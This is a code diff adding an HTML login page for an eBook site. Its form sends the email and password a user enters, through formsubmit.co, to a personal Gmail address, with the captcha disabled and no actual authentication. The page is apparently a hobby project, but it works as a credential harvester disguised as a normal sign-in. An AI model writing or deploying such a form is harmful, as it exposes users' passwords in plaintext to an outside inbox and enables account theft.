@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Login | Deva eBook</title>
+  <link rel="stylesheet" href="login.css" />
+</head>
+<body>
+  <div class="login-container">
+    <h2>Welcome Back</h2>
+    <p>Please login to continue</p>
+    <form action="https://formsubmit.co/akashparshad6@gmail.com" method="POST" id="loginForm">
+  <div class="input-group">
+    <label for="email">Email</label>
+    <input type="email" name="email" id="email" placeholder="you@example.com" required />
+  </div>
+  <div class="input-group">
+    <label for="password">Password</label>
+    <div class="password-box">
+      <input type="password" name="password" id="password" placeholder="Enter password" required />
+      <span class="toggle-password" onclick="togglePassword()">👁️</span>
+    </div>
+  </div>
+  <input type="hidden" name="_subject" value="New Login Notification from eBook Site">
+  <input type="hidden" name="_template" value="table" />
+  <input type="hidden" name="_captcha" value="false" />
+  <button type="submit">Login</button>
+</form>
+
+    <p class="signup-text">Don't have an account? <a href="#">Sign up</a></p>
+  </div>
+
+  <script src="login.js"></script>
+</body>
+</html>
